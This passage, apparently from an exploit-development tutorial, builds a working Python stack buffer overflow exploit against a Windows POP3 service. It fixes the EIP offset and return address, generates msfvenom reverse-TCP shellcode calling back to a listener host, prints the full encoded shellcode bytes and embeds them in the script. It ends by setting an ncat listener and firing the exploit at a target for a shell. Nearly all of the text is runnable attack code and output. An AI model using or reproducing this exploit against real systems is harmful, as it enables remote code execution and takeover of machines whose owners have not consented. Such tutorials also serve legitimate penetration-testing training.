pattern += "a8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8"
pattern += "Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be"
pattern += "9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9B"
pattern += "h0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0"
pattern += "Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl"
pattern += "1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1B"
pattern += "n2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2"
pattern += "Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br"
pattern += "3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3B"
pattern += "t4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4"
pattern += "Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx"
pattern += "5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5B"
pattern += "z6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6"
pattern += "Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd"
pattern += "7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7C"
pattern += "f8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8"
pattern += "Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj"
pattern += "9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9C"
pattern += "m0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0"
pattern += "Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq"
pattern += "1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1C"
pattern += "s2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2"
pattern += "Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw"
pattern += "3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3C"
pattern += "y4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4"
pattern += "Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc"
pattern += "5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5D"
pattern += "e6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6"
pattern += "Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di"
pattern += "7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7D"
pattern += "k8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"

#
# PAYLOAD
# Paste msfvenom command next line, payload info beneath, then payload.
# 

#################### Exploit
# Target crashes at "A" * 2700____________________ (# bytes: qty of char "A")
# Badchars: "\x00\x19\x1a\x1b\x1c"________________ (\xXX hex string)
# Pattern-generated EIP: "Ac3A"___________________ (4 bytes in hex)
# Specific offset (splat) is 69___________________ (# bytes)
# Usable JMP ESP at rev(0x65d11d71)_______________ (little-endian hex addr)   #MOD

sploit  = ""
sploit += ""           # protocol reqts
sploit += ""           # badchar test
sploit += ""           # pattern_create                                       
sploit += "A" * 69     # splat                                                
sploit += "\x71\x1d\xd1\x65"      # eip                                       #MOD
sploit += ""           # nopsled
sploit += ("C" * 375) + ("D" * 2000)    # payload                             
sploit +=              # nopsled

#################### Communication

# Standup
printinfo(["Creating socket ..."])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
printinfo(["Connecting to", ip, "on port", port, "..."])
connect = s.connect((ip, port))
s.recv(1024)

# Interact
printinfo(["Sending username \"test\" ..."])
s.send('USER test\r\n')
s.recv(1024)
printinfo(["Sending password of", len(sploit), "bytes..."])
s.send('PASS ' + sploit + '\r\n')

# Result
printresult(["Exploit sent. Attack complete."])

# Teardown
printinfo(["Quitting connection."])
s.send('QUIT\r\n')
s.close()
```

Part V: Generate shellcode.
================================================================================

### Discussion

A reasonable payload for our Windows-based target is a reverse-TCP shell. We use msfvenom to generate the shellcode. Be sure to pick an exit method that doesn't crash the host process (e.g., ExitProcess) if that's not desired behavior. Threaded applications can use ExitThread instead, which only kills the affected thread within the program. This is important for re-receiving your connection if the existing one drops or is closed. Also, it sets a less suspicious behavior pattern on the target system.

### [1] Generate the shellcode.

*Note that `windows/shell_reverse_tcp` is not the same as `windows/shell/reverse_tcp`. Also take note of the bad characters string to prevent
shellcode from using those characters. Lastly, outputting in C format has enabled better encoding in the past, but feel free to output in Python format for quicker integration, as this example does.*

```
root@kbox:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.42 LPORT=443 -f python -b \x00\x19\x1a\x1b\x1c -v payload
  No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  No Arch selected, selecting Arch: x86 from the payload
  Found 10 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 351 (iteration=0)
  x86/shikata_ga_nai chosen with final size 351
  Payload size: 351 bytes
  Final size of python file: 1838 bytes
  payload =  ""
  payload += "\xdb\xdd\xd9\x74\x24\xf4\x5b\xba\x8e\x23\x03\x8f"
  payload += "\x29\xc9\xb1\x52\x83\xeb\xfc\x31\x53\x13\x03\xdd"
  payload += "\x30\xe1\x7a\x1d\xde\x67\x84\xdd\x1f\x08\x0c\x38"
  payload += "\x2e\x08\x6a\x49\x01\xb8\xf8\x1f\xae\x33\xac\x8b"
  payload += "\x25\x31\x79\xbc\x8e\xfc\x5f\xf3\x0f\xac\x9c\x92"
  payload += "\x93\xaf\xf0\x74\xad\x7f\x05\x75\xea\x62\xe4\x27"
  payload += "\xa3\xe9\x5b\xd7\xc0\xa4\x67\x5c\x9a\x29\xe0\x81"
  payload += "\x6b\x4b\xc1\x14\xe7\x12\xc1\x97\x24\x2f\x48\x8f"
  payload += "\x29\x0a\x02\x24\x99\xe0\x95\xec\xd3\x09\x39\xd1"
  payload += "\xdb\xfb\x43\x16\xdb\xe3\x31\x6e\x1f\x99\x41\xb5"
  payload += "\x5d\x45\xc7\x2d\xc5\x0e\x7f\x89\xf7\xc3\xe6\x5a"
  payload += "\xfb\xa8\x6d\x04\x18\x2e\xa1\x3f\x24\xbb\x44\xef"
  payload += "\xac\xff\x62\x2b\xf4\xa4\x0b\x6a\x50\x0a\x33\x6c"
  payload += "\x3b\xf3\x91\xe7\xd6\xe0\xab\xaa\xbe\xc5\x81\x54"
  payload += "\x3f\x42\x91\x27\x0d\xcd\x09\xaf\x3d\x86\x97\x28"
  payload += "\x41\xbd\x60\xa6\xbc\x3e\x91\xef\x7a\x6a\xc1\x87"
  payload += "\xab\x13\x8a\x57\x53\xc6\x1d\x07\xfb\xb9\xdd\xf7"
  payload += "\xbb\x69\xb6\x1d\x34\x55\xa6\x1e\x9e\xfe\x4d\xe5"
  payload += "\x49\x0b\x92\xe5\xa3\x63\x90\xe5\xb2\xc8\x1d\x03"
  payload += "\xde\x3e\x48\x9c\x77\xa6\xd1\x56\xe9\x27\xcc\x13"
  payload += "\x29\xa3\xe3\xe4\xe4\x44\x89\xf6\x91\xa4\xc4\xa4"
  payload += "\x34\xba\xf2\xc0\xdb\x29\x99\x10\x95\x51\x36\x47"
  payload += "\xf2\xa4\x4f\x0d\xee\x9f\xf9\x33\xf3\x46\xc1\xf7"
  payload += "\x28\xbb\xcc\xf6\xbd\x87\xea\xe8\x7b\x07\xb7\x5c"
  payload += "\xd4\x5e\x61\x0a\x92\x08\xc3\xe4\x4c\xe6\x8d\x60"
  payload += "\x08\xc4\x0d\xf6\x15\x01\xf8\x16\xa7\xfc\xbd\x29"
  payload += "\x08\x69\x4a\x52\x74\x09\xb5\x89\x3c\x39\xfc\x93"
  payload += "\x15\xd2\x59\x46\x24\xbf\x59\xbd\x6b\xc6\xd9\x37"
  payload += "\x14\x3d\xc1\x32\x11\x79\x45\xaf\x6b\x12\x20\xcf"
  payload += "\xd8\x13\x61"
```

### [2] Add the payload to your script. 

Include your msfvenom command as a comment. Also add a NOP sled before and after your payload.

```
root@kali:~# vim sploit.py
```

```
#!/usr/bin/python

import socket, sys

#################### gsstyle
from colorama import Fore, Back, Style
colorama.init()

def printinfo(output):
  print Style.DIM + "[*] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printresult(output):
  print Style.BRIGHT + Fore.BLUE + "[>] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printalert(output):
  print Style.BRIGHT + Fore.RED + "[!] ",
  for field in output:
    print field,
  print Style.RESET_ALL

#################### Help section
if len(sys.argv) != 2:
  print "Usage: ./sys.argv[0] <ip.addr>"
  print
  print "ARGUMENT        FORMAT  DESCRIPTION"
  print " <ip.addr>       IPv4    IP address of host you want to test."
  print
  sys.exit(0)

#################### Variables
ip = sys.argv[1]   # string argument
port = 110         # int

# Initialize string of UTF hex values \x01 thru \xff for badchar testing:
chars  =     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
chars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
chars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
chars += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
chars += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
chars += "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
chars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
chars += "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
chars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
chars += "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
chars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
chars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
chars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
chars += "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
chars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
chars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#
# PATTERN
# echo -n "pattern  = "; ./pattern_create.rb -l 2700 | sed 's/.*/\"&\"/' |\
# sed 's/.\{62\}/&\"\npattern\ \+\=\ \"/g'
pattern  = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A"
pattern += "c0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0"
pattern += "Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag"
pattern += "1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1A"
pattern += "i2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2"
pattern += "Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am"
pattern += "3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3A"
pattern += "o4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4"
pattern += "Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As"
pattern += "5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5A"
pattern += "u6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6"
pattern += "Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay"
pattern += "7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7B"
pattern += "a8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8"
pattern += "Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be"
pattern += "9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9B"
pattern += "h0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0"
pattern += "Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl"
pattern += "1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1B"
pattern += "n2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2"
pattern += "Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br"
pattern += "3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3B"
pattern += "t4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4"
pattern += "Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx"
pattern += "5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5B"
pattern += "z6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6"
pattern += "Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd"
pattern += "7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7C"
pattern += "f8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8"
pattern += "Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj"
pattern += "9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9C"
pattern += "m0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0"
pattern += "Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq"
pattern += "1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1C"
pattern += "s2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2"
pattern += "Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw"
pattern += "3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3C"
pattern += "y4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4"
pattern += "Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc"
pattern += "5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5D"
pattern += "e6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6"
pattern += "Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di"
pattern += "7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7D"
pattern += "k8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"

#
# PAYLOAD
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.42 LPORT=443 -f python \ #MOD
# -b \x00\x19\x1a\x1b\x1c -v payload                                          #MOD
# x86/shikata_ga_nai chosen with final size 351                               #ADD
# Payload size: 351 bytes                                                     #ADD
# Final size of python file: 1838 bytes                                       #ADD
payload =  ""                                                                 #ADD
payload += "\xdb\xdd\xd9\x74\x24\xf4\x5b\xba\x8e\x23\x03\x8f"                 #ADD
payload += "\x29\xc9\xb1\x52\x83\xeb\xfc\x31\x53\x13\x03\xdd"                 #ADD
payload += "\x30\xe1\x7a\x1d\xde\x67\x84\xdd\x1f\x08\x0c\x38"                 #ADD
payload += "\x2e\x08\x6a\x49\x01\xb8\xf8\x1f\xae\x33\xac\x8b"                 #ADD
payload += "\x25\x31\x79\xbc\x8e\xfc\x5f\xf3\x0f\xac\x9c\x92"                 #ADD
payload += "\x93\xaf\xf0\x74\xad\x7f\x05\x75\xea\x62\xe4\x27"                 #ADD
payload += "\xa3\xe9\x5b\xd7\xc0\xa4\x67\x5c\x9a\x29\xe0\x81"                 #ADD
payload += "\x6b\x4b\xc1\x14\xe7\x12\xc1\x97\x24\x2f\x48\x8f"                 #ADD
payload += "\x29\x0a\x02\x24\x99\xe0\x95\xec\xd3\x09\x39\xd1"                 #ADD
payload += "\xdb\xfb\x43\x16\xdb\xe3\x31\x6e\x1f\x99\x41\xb5"                 #ADD
payload += "\x5d\x45\xc7\x2d\xc5\x0e\x7f\x89\xf7\xc3\xe6\x5a"                 #ADD
payload += "\xfb\xa8\x6d\x04\x18\x2e\xa1\x3f\x24\xbb\x44\xef"                 #ADD
payload += "\xac\xff\x62\x2b\xf4\xa4\x0b\x6a\x50\x0a\x33\x6c"                 #ADD
payload += "\x3b\xf3\x91\xe7\xd6\xe0\xab\xaa\xbe\xc5\x81\x54"                 #ADD
payload += "\x3f\x42\x91\x27\x0d\xcd\x09\xaf\x3d\x86\x97\x28"                 #ADD
payload += "\x41\xbd\x60\xa6\xbc\x3e\x91\xef\x7a\x6a\xc1\x87"                 #ADD
payload += "\xab\x13\x8a\x57\x53\xc6\x1d\x07\xfb\xb9\xdd\xf7"                 #ADD
payload += "\xbb\x69\xb6\x1d\x34\x55\xa6\x1e\x9e\xfe\x4d\xe5"                 #ADD
payload += "\x49\x0b\x92\xe5\xa3\x63\x90\xe5\xb2\xc8\x1d\x03"                 #ADD
payload += "\xde\x3e\x48\x9c\x77\xa6\xd1\x56\xe9\x27\xcc\x13"                 #ADD
payload += "\x29\xa3\xe3\xe4\xe4\x44\x89\xf6\x91\xa4\xc4\xa4"                 #ADD
payload += "\x34\xba\xf2\xc0\xdb\x29\x99\x10\x95\x51\x36\x47"                 #ADD
payload += "\xf2\xa4\x4f\x0d\xee\x9f\xf9\x33\xf3\x46\xc1\xf7"                 #ADD
payload += "\x28\xbb\xcc\xf6\xbd\x87\xea\xe8\x7b\x07\xb7\x5c"                 #ADD
payload += "\xd4\x5e\x61\x0a\x92\x08\xc3\xe4\x4c\xe6\x8d\x60"                 #ADD
payload += "\x08\xc4\x0d\xf6\x15\x01\xf8\x16\xa7\xfc\xbd\x29"                 #ADD
payload += "\x08\x69\x4a\x52\x74\x09\xb5\x89\x3c\x39\xfc\x93"                 #ADD
payload += "\x15\xd2\x59\x46\x24\xbf\x59\xbd\x6b\xc6\xd9\x37"                 #ADD
payload += "\x14\x3d\xc1\x32\x11\x79\x45\xaf\x6b\x12\x20\xcf"                 #ADD
payload += "\xd8\x13\x61"                                                     #ADD

#################### Exploit
# Target crashes at "A" * 2700____________________ (# bytes: qty of char "A")
# Badchars: "\x00\x19\x1a\x1b\x1c"________________ (\xXX hex string)
# Pattern-generated EIP: "Ac3A"___________________ (4 bytes in hex)
# Specific offset (splat) is 69___________________ (# bytes)
# Usable JMP ESP at rev(0x65d11d71)_______________ (little-endian hex addr)   

sploit  = ""
sploit += ""           # protocol reqts
sploit += ""           # badchar test
sploit += ""           # pattern_create                                       
sploit += "A" * 69     # splat                                                
sploit += "\x71\x1d\xd1\x65"      # eip                                       
sploit += "\x90" * 10  # nopsled                                              #MOD
sploit += payload      # payload                                              #MOD                             
sploit += "\x90" * 10  # nopsled                                              #MOD

#################### Communication

# Standup
printinfo(["Creating socket ..."])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
printinfo(["Connecting to", ip, "on port", port, "..."])
connect = s.connect((ip, port))
s.recv(1024)

# Interact
printinfo(["Sending username \"test\" ..."])
s.send('USER test\r\n')
s.recv(1024)
printinfo(["Sending password of", len(sploit), "bytes..."])
s.send('PASS ' + sploit + '\r\n')

# Result
printresult(["Exploit sent. Attack complete."])

# Teardown
printinfo(["Quitting connection."])
s.send('QUIT\r\n')
s.close()
```

Part VI: Fire your exploit.
================================================================================

This is the easy part.

### [1] Test exploit against debugging machine.

Set listener on Kali.

```
root@kali:~# ncat -nvlp 443
```

Run your exploit script in another terminal.

```
root@kali:~# python sploit.py
```

Receive your shell from your debug machine.

### [2] Run exploit against target.

Repeat step 1 against your actual target. Shell time.


<br>
